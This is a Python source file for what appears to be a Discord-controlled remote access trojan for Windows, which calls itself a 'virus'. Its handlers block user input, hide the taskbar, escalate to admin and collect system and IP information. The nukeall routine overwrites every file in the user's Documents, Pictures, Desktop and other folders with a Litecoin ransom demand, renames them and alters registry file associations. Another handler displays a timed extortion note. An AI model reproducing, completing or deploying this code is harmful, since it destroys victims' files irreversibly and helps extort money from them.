import ctypes,threading,os;import winreg as reg;import queue;import subprocess,webbrowser,asyncio,platform,sys,psutil,cpuinfo,GPUtil,socket,discord
async def nomouse(ctx, action):
 try:
  if action == "start":
   ctypes.windll.user32.BlockInput(True)
   await ctx.send("Mouse and keyboard input have been blocked.")
  elif action == "stop":
   ctypes.windll.user32.BlockInput(False)
   await ctx.send("Mouse and keyboard input have been unblocked.")
  else:
   await ctx.send("Invalid action. Use 'start' to block or 'stop' to unblock.")
 except Exception as e:
  await ctx.send(f"Error: {e}")

async def taskbar(ctx, action):
 try:
  hwnd_taskbar = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
  if action == "hide":
   ctypes.windll.user32.ShowWindow(hwnd_taskbar, 0)
   await ctx.send("Taskbar hidden.")
  elif action == "show":
   ctypes.windll.user32.ShowWindow(hwnd_taskbar, 5)
   await ctx.send("Taskbar shown.")
  else:
   await ctx.send("Invalid argument. Use 'hide' or 'show'.")
 except Exception as e:
  await ctx.send(f"Error: {e}")

async def nukeall(ctx):
 def process_file(p):
  attempts = 0
  while attempts < 3:
   try:
    if p.endswith('.openme'): return
    with open(p, 'w') as f:
     f.write("hello if you are wondering what happened here, it is because it is locked. in order to unlock this file and the rest of ur pc? you must pay 100 us dollars in litecoin to the address: LaHL1jGMk2VUgn6c4QtFVLi7BjycWrQorB")
    new_p = os.path.splitext(p)[0] + '.openme'
    os.rename(p, new_p)
    set_default_app(new_p)
    return
   except: attempts += 1

 def set_default_app(file_path):
  try:
   key = r"Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.openme\UserChoice"
   reg.CreateKey(reg.HKEY_CURRENT_USER, key)
   with reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_WRITE) as hkey:
    reg.SetValueEx(hkey, "Progid", 0, reg.REG_SZ, "txtfile")
  except: pass

 def worker():
  while not file_queue.empty():
   file = file_queue.get()
   process_file(file)
   file_queue.task_done()

 directories = [
  os.path.expanduser('~') + "\\Downloads",
  os.path.expanduser('~') + "\\Documents",
  os.path.expanduser('~') + "\\Pictures",
  os.path.expanduser('~') + "\\Videos",
  os.path.expanduser('~') + "\\Desktop",
  os.path.expanduser('~') + "\\Favorites",
  os.path.expanduser('~') + "\\Links",
  os.path.expanduser('~') + "\\Saved Games",
  os.path.expanduser('~') + "\\Searches"
 ]
 file_queue = queue.Queue()
 for _ in range(5):
  for directory in directories:
   for r, d1, f in os.walk(directory, topdown=False):
    for fi in f:
     file_queue.put(os.path.join(r, fi))
 threads = []
 for _ in range(5):
  t = threading.Thread(target=worker)
  t.start()
  threads.append(t)

 for t in threads:
  t.join()
 set_default_app(None)

 await ctx.send("all files nuked!")
async def paynow(ctx):
    try:
        username = subprocess.check_output("whoami").decode().strip()
        file_path = os.path.expanduser('~') + "\\Documents\\10101.txt"
        with open(file_path, 'w') as f:
            f.write(f"PAY 100 USD IN LITECOIN TO ADDRESS LaHL1jGMk2VUgn6c4QtFVLi7BjycWrQorB WITHIN 6 MINUTES, OR YOUR PC GOES BYE BYE\nYOU CAN BUY LITECOIN AT https://bitpay.com/buy-litecoin/\nGOOD LUCK {username}!!!")
        for _ in range(3):
            subprocess.Popen(['notepad.exe', file_path])
            subprocess.run('nircmd win maximize ititle "10101.txt"', shell=True)
        await ctx.send("Ransom message showed")
    except Exception as e:
        return
async def admin(ctx):
    try:
        if ctypes.windll.shell32.IsUserAnAdmin():
            await ctx.send("virus already has admin perms")
            return

        script = sys.argv[0]
        params = " ".join(sys.argv[1:])
        command = f"python {script} {params}"

        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, command, None, 1)
        sys.exit()

    except Exception as e:
        await ctx.send(f"Error: {e}")
async def detailed_hardware_info(ctx):
 try:
  cpu_name=None
  cpu_architecture=None
  cpu_cores=None
  cpu_threads=None
  cpu_current_freq=None
  cpu_max_freq=None
  try:
   cpu_info=cpuinfo.get_cpu_info()
   cpu_name=cpu_info.get('brand_raw')
   cpu_architecture=cpu_info.get('arch')
  except:
   pass
  try:
   cpu_cores=psutil.cpu_count(logical=False)
   cpu_threads=psutil.cpu_count(logical=True)
   cpu_freq=psutil.cpu_freq()
   if cpu_freq:
    cpu_current_freq=f"{cpu_freq.current:.2f} MHz"
    cpu_max_freq=f"{cpu_freq.max:.2f} MHz"
  except:
   pass
  ram_total=None
  ram_used=None
  ram_available=None
  try:
   ram=psutil.virtual_memory()
   ram_total=f"{ram.total/(1024**3):.2f} GB"
   ram_used=f"{ram.used/(1024**3):.2f} GB ({ram.percent}%)"
   ram_available=f"{ram.available/(1024**3):.2f} GB"
  except:
   pass
  disk_info=''
  try:
   disks=psutil.disk_partitions()
   for disk in disks:
    try:
     usage=psutil.disk_usage(disk.mountpoint)
     disk_info+=f"{disk.device} - {disk.mountpoint}\n  Total: {usage.total/(1024**3):.2f} GB\n  Used: {usage.used/(1024**3):.2f} GB ({usage.percent}%)\n  Free: {usage.free/(1024**3):.2f} GB\n"
    except PermissionError:
     pass
  except:
   pass
  gpu_info=''
  try:
   gpus=GPUtil.getGPUs()
   for gpu in gpus:
    gpu_info+=f"GPU: {gpu.name}\n  Memory Total: {gpu.memoryTotal} MB\n  Memory Used: {gpu.memoryUsed} MB\n  Memory Free: {gpu.memoryFree} MB\n  GPU Utilization: {gpu.load*100}%\n  GPU Temperature: {gpu.temperature}°C\n"
  except:
   pass
  ip_address=socket.gethostbyname(socket.gethostname())
  system_info=platform.uname()
  embed=discord.Embed(title="Hardware Information", color=discord.Color.blue())
  if cpu_name: embed.add_field(name="CPU Info", value=f"Name: {cpu_name}\nArchitecture: {cpu_architecture}\nCores: {cpu_cores}\nThreads: {cpu_threads}\nCurrent Frequency: {cpu_current_freq}\nMax Frequency: {cpu_max_freq}", inline=False)
  if ram_total: embed.add_field(name="RAM Info", value=f"Total: {ram_total}\nUsed: {ram_used}\nAvailable: {ram_available}", inline=False)
  if disk_info: embed.add_field(name="Disk Info", value=disk_info, inline=False)
  if gpu_info: embed.add_field(name="GPU Info", value=gpu_info, inline=False)
  embed.add_field(name="IP Address", value=ip_address, inline=False)
  embed.add_field(name="System Info", value=f"System: {system_info.system}\nNode Name: {system_info.node}\nRelease: {system_info.release}\nVersion: {system_info.version}\nMachine: {system_info.machine}\nProcessor: {system_info.processor}", inline=False)
  await ctx.send(embed=embed)
 except Exception as e:
  await ctx.send(f"Error retrieving hardware information: {str(e)}")